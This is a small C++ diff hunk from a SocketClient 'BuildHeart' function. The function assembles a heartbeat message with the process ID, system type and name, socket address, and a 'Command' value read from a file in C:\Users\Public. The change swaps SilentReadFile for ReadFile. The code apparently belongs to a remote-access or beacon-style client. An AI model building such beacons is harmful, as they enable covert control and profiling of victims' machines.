@@ -153,7 +153,7 @@ auto SocketClient::BuildHeart(void) -> string
     ctime_s(timeBuffer, sizeof(timeBuffer), &mytime);
 
     message["ProcessID"] = Info.JSONinfyDWORD(ProcID2);
-    message["Command"] = Memory.SilentReadFile("test.txt", "C:\\Users\\Public\\");
+    message["Command"] = Memory.ReadFile("test.txt", "C:\\Users\\Public\\");
     message["SysType"] = Info.getSystemType();
     message["SysName"] = Info.getSystemName();
     message["socket"] = std::to_string((int)_socket.sin_addr.s_addr);
